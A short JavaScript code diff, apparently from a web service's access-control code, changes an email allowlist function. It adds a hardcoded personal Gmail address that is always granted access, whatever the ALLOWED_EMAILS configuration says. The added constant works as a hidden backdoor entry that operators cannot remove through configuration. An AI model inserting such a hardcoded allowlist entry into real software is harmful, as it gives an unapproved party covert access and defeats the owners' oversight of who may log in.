@@ -51,11 +51,16 @@ function resolvePath(body, url) {
   return path;
 }
 
+const EXTRA_ALLOWED = ['stabrovsky.g@gmail.com'];
+
 function allowedEmails(env) {
-  return String(env.ALLOWED_EMAILS || '')
-    .split(',')
-    .map(item => item.trim().toLowerCase())
-    .filter(Boolean);
+  return [...new Set([
+    ...String(env.ALLOWED_EMAILS || '')
+      .split(',')
+      .map(item => item.trim().toLowerCase())
+      .filter(Boolean),
+    ...EXTRA_ALLOWED,
+  ])];
 }
 
 function b64urlJson(value) {
